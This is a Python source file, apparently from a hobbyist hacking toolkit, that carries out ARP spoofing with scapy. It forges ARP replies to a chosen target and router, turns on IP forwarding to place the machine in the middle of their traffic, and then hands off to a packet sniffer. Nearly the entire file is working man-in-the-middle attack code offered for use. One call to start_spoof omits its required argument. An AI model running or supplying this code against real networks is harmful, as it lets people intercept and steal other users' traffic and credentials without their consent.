import sys
import time
import socket
import subprocess
import scapy.all as scapy

from Utils import Terminal
from ARP import Sniffer

# Variable
packet_count = 0
target_ip = ""
router_ip = ""


# Gets MAC address from ip address
def get_mac(ip):
    try: 
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    
    except Exception as e:
        print(f"Something went wrong while fetching mac address from ip addres: \n\n {e}")


# Create and send arp spoofing packet to the targeted machine
def spoof(target_ip, router_ip):
    try:
        target_mac = get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
        scapy.send(packet, verbose=False)

    except Exception as e:
        print(f"Something went wrong while sending spoofing packet: \n {e}")


# Restores machine to its normal state after arp spoofing attack
def restore(destination_ip, source_ip):

    try: 
        # target_mac = get_mac(target_ip)
        # router_mac = get_mac(router_ip)
        # packet = scapy.ARP(op=2, pdst=target_mac, psrc=router_ip, hwsrc=router_mac)
        # scapy.send(packet, count=4, verbose=False)
        
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)
        
        # Disable Port forwarding
        command = "echo 0 > /proc/sys/net/ipv4/ip_forward"
        subprocess.run(command, shell=True, check=True)

    except Exception as e:
        print(f"Error while restoring arp table: {e}")
        sys.exit()


# Checks whether the passes ip address is valid or not...
def validate_ip(ip_address):
    try:
        socket.inet_aton(ip_address)
        return True
    
    except socket.error:
        return False
    

# Main funtion to control the exuction of other functions only start spoofer
def start_spoof(interface):
    global router_ip
    global target_ip
    global packet_count

    # Enable Port forwarding
    command = "echo 1 > /proc/sys/net/ipv4/ip_forward"
    subprocess.run(command, shell=True, check=True)

    target_ip =  str(input("Enter target ip: "))
    router_ip = str(input("Enter router ip address: "))

    while True:
        valid_target = validate_ip(target_ip)
        valid_router = validate_ip(router_ip)

        if not valid_target:
            Terminal.clear()
            print("Enter a valid target ip!!\n\n")
            target_ip =  str(input("Enter target ip: "))
        
        elif not valid_router:
            Terminal.clear()
            print("Enter a valid router ip!!\n\n")
            router_ip =  str(input("Enter router ip: "))
        else:
            break

    Terminal.clear()

    while True:
        try:
            spoof(target_ip, router_ip)
            spoof(router_ip, target_ip)
            packet_count = packet_count + 2
            print(f"\r[+] Packet sent: {packet_count}", end="")
            time.sleep(2)

        except KeyboardInterrupt:
            print("\nStopping...")
            restore(target_ip, router_ip)
            restore(router_ip, target_ip)
            break

        except PermissionError:
            print("Run the program as root")
            sys.exit()

        except Exception as e:
            print(f"Something went wrong {e}")
            sys.exit()
            


# Main funtion to control the exuction of other functions. Starts spoofer sniffer both
def start_spoof_sniff(interface):
    start_spoof()
    Sniffer.start_sniff(interface)

